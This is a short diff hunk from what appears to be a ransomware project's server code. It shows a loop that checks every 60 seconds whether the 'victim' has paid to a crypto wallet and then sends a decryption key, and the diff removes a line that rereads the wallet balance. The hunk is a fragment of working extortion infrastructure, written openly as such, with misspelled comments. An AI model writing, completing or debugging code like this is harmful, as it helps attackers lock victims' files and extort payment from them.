@@ -205,9 +205,6 @@ class Server:
                     #Every  60 seconds check if victim paid, if they did send them a message
                     time.sleep(60)
                     # paid = self.check_if_user_paid()
-                    global initial_balance
-                    initial_balance = self.get_balance(WALLET_ADDRESS)
-
 
                     if(self.check_if_user_paid(initial_balance)):
                         # sends decryption key  (victim is also simulaenously checking if paid and if they have it recives the thingsb bellow)
